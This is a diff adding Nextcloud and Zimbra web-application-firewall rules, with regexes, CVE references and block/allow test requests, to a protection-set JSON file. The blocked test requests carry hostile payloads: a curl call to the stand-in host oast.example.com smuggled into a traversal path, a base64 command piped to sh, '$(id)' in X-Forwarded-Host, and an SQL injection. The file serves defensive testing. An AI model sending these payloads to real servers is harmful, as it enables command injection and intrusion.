@@ -1,5 +1,5 @@
 {
- "_comment": "Application protection sets (protsets.py). sets: [{id, app (the software list's name), rules: [{id, default (ticked), needs (packages the rule is about, for the page), spec (a confident block without host: target, header, arg, regex, exceptions, msg, reference, source), tests (sandbox requests: path, method, headers, body, expect 403|200, source external|internal; the site is filled in), refs (sources), cves}]}]. Titles and explanations are UI strings protset.r.<set>.<rule> / protset.w.<set>.<rule>. Every rule is written from public information or measured on a real DSM (see refs; the QNAP set is written from public write-ups only, no QNAP was at hand); tests/test_protsets.py checks each attack test matches its rule and each ordinary test does not.",
+ "_comment": "Application protection sets (protsets.py). sets: [{id, app (the software list's name), rules: [{id, default (ticked), needs (packages the rule is about, for the page), spec (a confident block without host: target, header, arg, regex, exceptions, msg, reference, source), tests (sandbox requests: path, method, headers, body, expect 403|200, source external|internal; the site is filled in), refs (sources), cves}]}]. Titles and explanations are UI strings protset.r.<set>.<rule> / protset.w.<set>.<rule>. Every rule is written from public information or measured on a real DSM (see refs; the QNAP, Nextcloud and Zimbra sets are written from public write-ups and the sources, checked in a real nginx + ModSecurity 3.0.9 / 3.0.17 + CRS 4.30 sandbox); tests/test_protsets.py checks each attack test matches its rule and each ordinary test does not.",
  "sets": [
   {
    "id": "synology-dsm",
@@ -980,6 +980,1549 @@
       "https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual-(v3.x)"
      ],
      "cves": []
+    }
+   ]
+  },
+  {
+   "id": "nextcloud",
+   "app": "Nextcloud",
+   "rules": [
+    {
+     "id": "nonpublic-dirs",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:build|tests|config|lib|3rdparty|templates|data)(?:/|$)",
+      "msg": "Nextcloud non-public directory (official nginx config returns 404)",
+      "source": "external",
+      "reference": "https://docs.nextcloud.com/server/latest/admin_manual/installation/nginx.html"
+     },
+     "tests": [
+      {
+       "path": "/config/config.php",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/remote.php/dav/files/alice/config/",
+       "method": "PROPFIND",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)",
+        "Depth": "1",
+        "Content-Type": "application/xml; charset=utf-8",
+        "Authorization": "Basic YWxpY2U6YXBwLXBhc3N3b3Jk"
+       },
+       "body": "<?xml version=\"1.0\"?><d:propfind xmlns:d=\"DAV:\" xmlns:oc=\"http://owncloud.org/ns\" xmlns:nc=\"http://nextcloud.org/ns\"><d:prop><d:resourcetype/><d:getlastmodified/><d:getcontentlength/><d:getetag/><oc:id/><oc:fileid/><oc:permissions/><oc:size/><nc:has-preview/></d:prop></d:propfind>",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://docs.nextcloud.com/server/latest/admin_manual/installation/nginx.html",
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample",
+      "https://github.com/nextcloud/server/blob/master/.htaccess"
+     ],
+     "cves": []
+    },
+    {
+     "id": "hidden-root-files",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:\\.(?!well-known(?:/|$))|autotest|occ|issue|indie|db_|console)",
+      "msg": "Nextcloud hidden root file (.htaccess, .user.ini, occ, console.php, db_structure.xml)",
+      "source": "all",
+      "reference": "https://docs.nextcloud.com/server/latest/admin_manual/installation/nginx.html"
+     },
+     "tests": [
+      {
+       "path": "/.htaccess",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/.well-known/caldav",
+       "method": "PROPFIND",
+       "headers": {
+        "User-Agent": "DAVx5/4.4.2-ose (2026/09/01; dav4jvm; okhttp/4.12.0) Android/15",
+        "Depth": "0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://docs.nextcloud.com/server/latest/admin_manual/installation/nginx.html",
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample",
+      "https://github.com/nextcloud/server/blob/master/.htaccess"
+     ],
+     "cves": []
+    },
+    {
+     "id": "metadata-files",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:composer\\.(?:json|lock)|package(?:-lock)?\\.json|core/shipped\\.json)$",
+      "msg": "Nextcloud dependency metadata file (official nginx config returns 404)",
+      "source": "all",
+      "reference": "https://docs.nextcloud.com/server/latest/admin_manual/installation/nginx.html"
+     },
+     "tests": [
+      {
+       "path": "/composer.lock",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/remote.php/dav/files/alice/project/package.json",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)",
+        "Authorization": "Basic YWxpY2U6YXBwLXBhc3N3b3Jk"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://docs.nextcloud.com/server/latest/admin_manual/installation/nginx.html",
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample"
+     ],
+     "cves": []
+    },
+    {
+     "id": "root-infoleak-files",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:authors|copying(?:-agpl|-readme)?|changelog\\.md|readme(?:\\.md)?|caddyfile|reuse\\.toml|openapi\\.json|custom\\.d\\.ts|cypress\\.d\\.ts|version\\.php)$",
+      "msg": "Nextcloud release file that only reveals version/build information",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/updater/blob/master/index.php"
+     },
+     "tests": [
+      {
+       "path": "/CHANGELOG.md",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/status.php",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/updater/blob/master/index.php",
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample"
+     ],
+     "cves": []
+    },
+    {
+     "id": "app-internals",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:index\\.php/)?(?:apps|custom_apps|extra_apps|apps-extra)/[^/]+/(?:appinfo/|tests/|vendor/|composer\\.(?:json|lock)$|package(?:-lock)?\\.json$|psalm\\.xml$|phpunit[^/]*\\.xml$|krankerl\\.toml$|makefile$)",
+      "msg": "Nextcloud app internal file (appinfo, vendor, tests, composer metadata)",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample"
+     },
+     "tests": [
+      {
+       "path": "/apps/richdocumentscode/appinfo/info.xml",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/apps/calendar/js/calendar-main.mjs?v=5d2a1c",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-49103.yaml",
+      "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
+     ],
+     "cves": [
+      "CVE-2023-49103"
+     ]
+    },
+    {
+     "id": "dot-segment-path",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "raw_uri",
+      "regex": "^[^?#]*(?:/|\\x5c|%(?:25)*(?:2f|5c))(?:\\.|%(?:25)*2e){2}(?:/|\\x5c|%(?:25)*(?:2f|5c)|[?#]|$)",
+      "msg": "Dot-dot path segment in the request path (raw or multi-encoded)",
+      "source": "all",
+      "reference": "https://github.com/CollaboraOnline/richdocumentscode/issues/354"
+     },
+     "tests": [
+      {
+       "path": "/x$(curl${IFS}-s${IFS}oast.example.com)x/%2e%2e/apps/richdocumentscode/proxy.php?status",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/remote.php/dav/files/alice/Photos/2026..11%20trip/",
+       "method": "PROPFIND",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)",
+        "Depth": "1",
+        "Content-Type": "application/xml; charset=utf-8",
+        "Authorization": "Basic YWxpY2U6YXBwLXBhc3N3b3Jk"
+       },
+       "body": "<?xml version=\"1.0\"?><d:propfind xmlns:d=\"DAV:\" xmlns:oc=\"http://owncloud.org/ns\" xmlns:nc=\"http://nextcloud.org/ns\"><d:prop><d:resourcetype/><d:getlastmodified/><d:getcontentlength/><d:getetag/><oc:id/><oc:fileid/><oc:permissions/><oc:size/><nc:has-preview/></d:prop></d:propfind>",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/CollaboraOnline/richdocumentscode/issues/354",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-110447.yaml",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-29059.yaml",
+      "https://github.com/nextcloud/server/blob/stable34/config/config.sample.php"
+     ],
+     "cves": [
+      "CVE-2026-110447",
+      "CVE-2026-29059"
+     ]
+    },
+    {
+     "id": "webdav-destination-dot-segment",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "header",
+      "regex": "(?i)(?:^|/|\\\\|%(?:25)*(?:2f|5c))(?:\\.|%(?:25)*2e){2}(?:/|\\\\|%(?:25)*(?:2f|5c)|$)",
+      "msg": "WebDAV MOVE/COPY Destination header with a dot-dot segment",
+      "source": "all",
+      "reference": "https://github.com/coreruleset/nextcloud-rule-exclusions-plugin/blob/main/plugins/nextcloud-rule-exclusions-before.conf",
+      "header": "Destination"
+     },
+     "tests": [
+      {
+       "path": "/remote.php/dav/files/alice/report.odt",
+       "method": "MOVE",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)",
+        "Authorization": "Basic YWxpY2U6YXBwLXBhc3N3b3Jk",
+        "Destination": "https://cloud.example.com/remote.php/dav/files/alice/../bob/report.odt",
+        "Overwrite": "F"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/remote.php/dav/uploads/alice/web-file-upload-7f3a9c/.file",
+       "method": "MOVE",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Destination": "https://cloud.example.com/remote.php/dav/files/alice/Videos/trip%20..%202026.mp4",
+        "OC-Total-Length": "52428800"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/coreruleset/nextcloud-rule-exclusions-plugin/blob/main/plugins/nextcloud-rule-exclusions-before.conf",
+      "https://github.com/nextcloud/server/blob/stable34/config/config.sample.php",
+      "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-273v-9h7x-p68v"
+     ],
+     "cves": [
+      "CVE-2023-25579"
+     ]
+    },
+    {
+     "id": "richdocumentscode-path-injection",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "raw_uri",
+      "regex": "^[^?#]*(?:\\$[({]|%24(?:[({]|%28|%7b)|\\x60|%60)[^?#]*/richdocumentscode(?:_arm64)?/proxy\\.php",
+      "msg": "Shell substitution before richdocumentscode proxy.php (CVE-2026-110447, CISA KEV)",
+      "source": "all",
+      "reference": "https://github.com/CollaboraOnline/richdocumentscode/blob/26.4.302/proxy.php"
+     },
+     "tests": [
+      {
+       "path": "/x$(echo${IFS}aWQ=|base64${IFS}-d|sh)x/../apps/richdocumentscode/proxy.php?status",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/apps/richdocumentscode/proxy.php?status",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/CollaboraOnline/richdocumentscode/blob/26.4.302/proxy.php",
+      "https://github.com/CollaboraOnline/richdocumentscode/compare/26.4.302...26.4.303",
+      "https://github.com/CollaboraOnline/richdocumentscode/issues/354",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-110447"
+     ],
+     "cves": [
+      "CVE-2026-110447"
+     ]
+    },
+    {
+     "id": "x-forwarded-host-charset",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "header",
+      "regex": "[\\x24\\x60;|&<>(){}\\x27\\x5c]",
+      "msg": "X-Forwarded-Host from a client with shell characters (CVE-2025-66208)",
+      "source": "external",
+      "reference": "https://github.com/CollaboraOnline/online/security/advisories/GHSA-j3q6-q5pc-v5wf",
+      "header": "X-Forwarded-Host"
+     },
+     "tests": [
+      {
+       "path": "/apps/richdocumentscode/proxy.php?status",
+       "method": "GET",
+       "headers": {
+        "X-Forwarded-Host": "evil.example.net$(id)"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/apps/richdocumentscode/proxy.php?status",
+       "method": "GET",
+       "headers": {
+        "X-Forwarded-Host": "cloud.example.com",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/CollaboraOnline/online/security/advisories/GHSA-j3q6-q5pc-v5wf",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-66208"
+     ],
+     "cves": [
+      "CVE-2025-66208"
+     ]
+    },
+    {
+     "id": "richdocumentscode-unused",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:index\\.php/)?(?:apps|custom_apps|extra_apps|apps-extra)/richdocumentscode(?:_arm64)?(?:/|$)",
+      "msg": "Built-in CODE server path on an instance that does not use it",
+      "source": "all",
+      "reference": "https://github.com/CollaboraOnline/online/security/advisories/GHSA-g3vx-3m76-fghh"
+     },
+     "tests": [
+      {
+       "path": "/apps/richdocumentscode/proxy.php?nuclei_detect",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/index.php/apps/richdocuments/settings/fonts.json",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "COOLWSD HTTP Agent 26.04.3.3"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/CollaboraOnline/online/security/advisories/GHSA-g3vx-3m76-fghh",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-110447.yaml",
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample"
+     ],
+     "cves": [
+      "CVE-2026-110447"
+     ]
+    },
+    {
+     "id": "updater-external",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/updater(?:/|$)",
+      "msg": "Nextcloud web updater from outside",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/updater/blob/master/index.php"
+     },
+     "tests": [
+      {
+       "path": "/updater/",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/status.php",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/updater/blob/master/index.php",
+      "https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx-root.conf.sample"
+     ],
+     "cves": []
+    },
+    {
+     "id": "web-upgrade-external",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:ocs/v[12]\\.php/core/update|(?:index\\.php/)?core/ajax/update\\.php)$",
+      "msg": "Unauthenticated web database-upgrade trigger from outside",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/core/Controller/UpdateController.php"
+     },
+     "tests": [
+      {
+       "path": "/ocs/v2.php/core/update",
+       "method": "GET",
+       "headers": {
+        "Accept": "text/event-stream"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/ocs/v2.php/cloud/capabilities?format=json",
+       "method": "GET",
+       "headers": {
+        "OCS-APIRequest": "true",
+        "User-Agent": "Mozilla/5.0 (Android) Nextcloud-android/3.33.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/core/Controller/UpdateController.php",
+      "https://github.com/nextcloud/server/blob/stable34/lib/base.php",
+      "https://github.com/nextcloud/server/blob/stable34/config/config.sample.php",
+      "https://github.com/nextcloud/desktop"
+     ],
+     "cves": []
+    },
+    {
+     "id": "openmetrics-external",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:index\\.php/)?metrics$",
+      "msg": "Nextcloud OpenMetrics endpoint from outside",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/core/Controller/OpenMetricsController.php"
+     },
+     "tests": [
+      {
+       "path": "/metrics",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/index.php/apps/dashboard/",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/core/Controller/OpenMetricsController.php",
+      "https://github.com/nextcloud/server/blob/stable34/config/config.sample.php"
+     ],
+     "cves": []
+    },
+    {
+     "id": "admin-settings-external",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:index\\.php/)?settings/(?:admin(?:/|$)|apps(?:/|$)|setupcheck$|ajax/checksetup$|integrity/|api/admin/)",
+      "msg": "Nextcloud administration UI from outside",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/apps/settings/appinfo/routes.php"
+     },
+     "tests": [
+      {
+       "path": "/index.php/settings/admin/overview",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/index.php/settings/user/security",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/apps/settings/appinfo/routes.php",
+      "https://github.com/nextcloud/server/blob/stable34/apps/appstore/lib/Controller/PageController.php"
+     ],
+     "cves": []
+    },
+    {
+     "id": "app-management-external",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:ocs/v[12]\\.php/(?:apps/appstore/api/v[0-9]+/(?:apps/(?:enable|disable|uninstall|update)|bundles/enable)|cloud/apps(?:/|$))|(?:index\\.php/)?settings/apps/(?:enable|disable|force|uninstall|update)(?:/|$))",
+      "msg": "Install/enable/update app from outside",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/apps/appstore/lib/Controller/ApiController.php"
+     },
+     "tests": [
+      {
+       "path": "/ocs/v2.php/apps/appstore/api/v1/apps/enable",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/json",
+        "OCS-APIRequest": "true"
+       },
+       "body": "{\"appIds\":[\"files_external\"],\"groups\":[]}",
+       "expect": 403
+      },
+      {
+       "path": "/settings/apps/enabled",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/apps/appstore/lib/Controller/ApiController.php",
+      "https://github.com/nextcloud/server/blob/stable34/apps/provisioning_api/appinfo/routes.php",
+      "https://github.com/nextcloud/server/blob/stable34/apps/provisioning_api/lib/Controller/UsersController.php"
+     ],
+     "cves": []
+    },
+    {
+     "id": "provisioning-admin-actions-external",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/ocs/v[12]\\.php/cloud/users/[^/]+/(?:subadmins|wipe|enable|disable|welcome)$",
+      "msg": "User administration (wipe, enable/disable, sub-admin, welcome mail) from outside",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/apps/provisioning_api/appinfo/routes.php"
+     },
+     "tests": [
+      {
+       "path": "/ocs/v2.php/cloud/users/bob/wipe",
+       "method": "POST",
+       "headers": {
+        "OCS-APIRequest": "true",
+        "Authorization": "Basic YWRtaW46c3RvbGVu"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/ocs/v1.php/cloud/user?format=json",
+       "method": "GET",
+       "headers": {
+        "OCS-APIRequest": "true",
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/apps/provisioning_api/appinfo/routes.php",
+      "https://github.com/nextcloud/server/blob/stable34/apps/provisioning_api/lib/Controller/UsersController.php",
+      "https://github.com/nextcloud/android-library/blob/master/library/src/main/java/com/owncloud/android/lib/resources/users/SetUserInfoRemoteOperation.java",
+      "https://github.com/nextcloud/desktop"
+     ],
+     "cves": []
+    },
+    {
+     "id": "federation-receive-external",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:(?:index\\.php/)?ocm/(?:shares|notifications)$|ocs/v[12]\\.php/cloud/shares(?:/|$))",
+      "msg": "Incoming federated share endpoints on an instance without federation",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-5572-968j-v7g5"
+     },
+     "tests": [
+      {
+       "path": "/index.php/ocm/shares",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/json"
+       },
+       "body": "{\"shareWith\":\"alice@cloud.example.com\",\"name\":\"x\",\"providerId\":\"1\",\"owner\":\"e@203.0.113.9\",\"resourceType\":\"file\",\"shareType\":\"user\",\"protocol\":{\"name\":\"webdav\",\"options\":{\"sharedSecret\":\"s\"}}}",
+       "expect": 403
+      },
+      {
+       "path": "/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json&shared_with_me=false",
+       "method": "GET",
+       "headers": {
+        "OCS-APIRequest": "true",
+        "User-Agent": "Mozilla/5.0 (Linux) mirall/3.17.0 (Nextcloud, ubuntu-6.8.0 ClientArchitecture: x86_64 OsArchitecture: x86_64)"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-5572-968j-v7g5",
+      "https://github.com/nextcloud/server/blob/stable34/apps/cloud_federation_api/appinfo/routes.php",
+      "https://github.com/nextcloud/server/blob/stable34/apps/federatedfilesharing/appinfo/routes.php"
+     ],
+     "cves": [
+      "CVE-2026-77167"
+     ]
+    },
+    {
+     "id": "webcron-external",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/cron\\.php$",
+      "msg": "cron.php from outside on a system-cron instance",
+      "source": "external",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/cron.php"
+     },
+     "tests": [
+      {
+       "path": "/cron.php",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/status.php",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (Android) Nextcloud-android/3.33.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/cron.php",
+      "https://github.com/nextcloud/server/blob/stable34/core/Service/CronService.php",
+      "https://github.com/nextcloud/server/blob/stable34/core/src/ajax-cron.ts"
+     ],
+     "cves": []
+    },
+    {
+     "id": "installer-fields-external",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg_name",
+      "regex": "^(?:adminlogin|adminpass|dbpass|dbtablespace)$",
+      "msg": "Nextcloud installer form fields from outside",
+      "source": "external",
+      "reference": "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/nextcloud-install.yaml"
+     },
+     "tests": [
+      {
+       "path": "/index.php",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "install=true&adminlogin=admin&adminpass=Passw0rd-x&directory=%2Fvar%2Fwww%2Fdata&dbtype=sqlite",
+       "expect": 403
+      },
+      {
+       "path": "/index.php/login",
+       "method": "POST",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "user=alice&password=S3cret-pass&timezone=Asia%2FTaipei&timezone_offset=8&requesttoken=aBc%2BdEf%2F123%3D%3AXyZ",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/nextcloud-install.yaml",
+      "https://github.com/coreruleset/nextcloud-rule-exclusions-plugin/blob/main/plugins/nextcloud-rule-exclusions-before.conf",
+      "https://github.com/nextcloud/server/blob/stable34/core/Controller/SetupController.php"
+     ],
+     "cves": []
+    },
+    {
+     "id": "share-token-format",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:(?:index\\.php/)?s|public\\.php/dav/files)/(?![a-za-z0-9-]{1,32}(?:/|$))",
+      "msg": "Public share token that cannot exist (wrong characters or longer than 32)",
+      "source": "all",
+      "reference": "https://github.com/nextcloud/server/blob/stable34/apps/files_sharing/lib/Controller/ShareAPIController.php"
+     },
+     "tests": [
+      {
+       "path": "/s/abc'%20OR%201=1--/download",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/s/Xk7pQ2mN9aBcDeF",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/server/blob/stable34/apps/files_sharing/lib/Controller/ShareAPIController.php",
+      "https://github.com/nextcloud/server/blob/stable34/lib/private/Share/Constants.php"
+     ],
+     "cves": []
+    },
+    {
+     "id": "pdfviewer-dev-files",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:index\\.php/)?(?:apps|custom_apps|extra_apps|apps-extra)/files_pdfviewer/js/pdfjs/web/(?:viewer\\.html|compressed\\.tracemonkey-pldi-09\\.pdf)$",
+      "msg": "PDF.js development viewer shipped by files_pdfviewer (CVE-2025-59788)",
+      "source": "all",
+      "reference": "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-24wp-p865-7j4r"
+     },
+     "tests": [
+      {
+       "path": "/apps/files_pdfviewer/js/pdfjs/web/viewer.html?file=%2Fremote.php%2Fdav%2Ffiles%2Fbob%2Fx.pdf",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/apps/files_pdfviewer/?file=%2Fremote.php%2Fdav%2Ffiles%2Falice%2Fdoc.pdf&canDownload=1",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-24wp-p865-7j4r",
+      "https://github.com/nextcloud/files_pdfviewer/pull/1275",
+      "https://github.com/nextcloud/files_pdfviewer/blob/master/templates/viewer.php"
+     ],
+     "cves": [
+      "CVE-2025-59788"
+     ]
+    },
+    {
+     "id": "collabora-admin-console-external",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:(?:browser|loleaflet)/[^/]+/admin/|(?:cool|lool)/adminws(?:/|$))",
+      "msg": "Collabora Online admin console from outside",
+      "source": "external",
+      "reference": "https://sdk.collaboraonline.com/docs/installation/Proxy_settings.html"
+     },
+     "tests": [
+      {
+       "path": "/browser/dist/admin/admin.html",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/browser/f3a9c1/cool.html?WOPISrc=https%3A%2F%2Fcloud.example.com%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F42_ocabc",
+       "method": "GET",
+       "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+       },
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://sdk.collaboraonline.com/docs/installation/Proxy_settings.html",
+      "https://github.com/coreruleset/nextcloud-rule-exclusions-plugin/blob/main/plugins/nextcloud-rule-exclusions-before.conf"
+     ],
+     "cves": []
+    }
+   ]
+  },
+  {
+   "id": "zimbra",
+   "app": "Zimbra",
+   "rules": [
+    {
+     "id": "admin-surfaces",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?(?:service/(?:admin|collectconfig|collectldapconfig|afd|statsimg)(?:/|$)|service/extension/(?:backup|clientuploader|nginx-lookup)(?:/|$)|zimbraadmin(?:/|$))",
+      "msg": "Zimbra admin service or admin console path on the user port from outside",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-37042",
+      "source": "external"
+     },
+     "tests": [
+      {
